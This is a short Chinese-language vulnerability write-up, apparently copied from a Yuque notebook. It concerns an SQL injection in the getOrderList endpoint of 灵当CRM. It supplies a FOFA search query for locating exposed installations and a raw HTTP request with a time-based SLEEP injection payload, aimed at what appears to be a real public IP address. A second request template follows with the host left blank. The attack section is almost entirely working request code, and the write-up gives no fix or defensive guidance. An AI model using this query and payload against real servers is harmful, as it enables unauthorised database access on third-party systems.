# 灵当crm getOrderList存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当CRM客户管理系getOrderList存在SQL注入漏洞。</font>

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"` `<font style="color:rgb(51, 51, 51);">body="crmcommon/js/jquery/jquery-1.10.1.min.js"</font>`
+ 特征

![1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a.png](./img/HIaLS568Ua4tqtpX/1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a-553408.png)

# 四、漏洞复现
```java
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=11%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(1)))fiAG) HTTP/1.1
Host: 120.79.185.144:85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![1726734714363-2bcde573-1379-4233-b74e-f18ee0a65373.png](./img/HIaLS568Ua4tqtpX/1726734714363-2bcde573-1379-4233-b74e-f18ee0a65373-855630.png)

```java
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![1726734781470-32269f52-de00-4e64-b137-09ff307ffdb3.png](./img/HIaLS568Ua4tqtpX/1726734781470-32269f52-de00-4e64-b137-09ff307ffdb3-547283.png)



> 更新: 2024-10-21 11:49:38  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kuce46edah7b3gg3>